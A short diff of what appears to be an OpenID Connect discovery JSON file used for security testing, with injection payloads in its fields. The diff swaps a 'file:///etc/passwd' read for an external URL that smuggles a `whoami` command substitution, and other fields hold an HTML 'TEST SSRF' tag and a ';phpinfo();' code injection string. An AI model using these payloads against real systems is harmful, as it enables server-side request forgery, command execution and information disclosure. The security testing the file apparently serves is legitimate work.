@@ -20,7 +20,7 @@
    "<h1>TEST SSRF</h1>"
  ],
  "id_token_signing_alg_values_supported": [
-  "file:///etc/passwd"
+  "https://raw.githubusercontent.com/tanzz1337/PROJECT/main/ssrf.json?id=`whoami`"
  ],
  "scopes_supported": [
   ";phpinfo();",
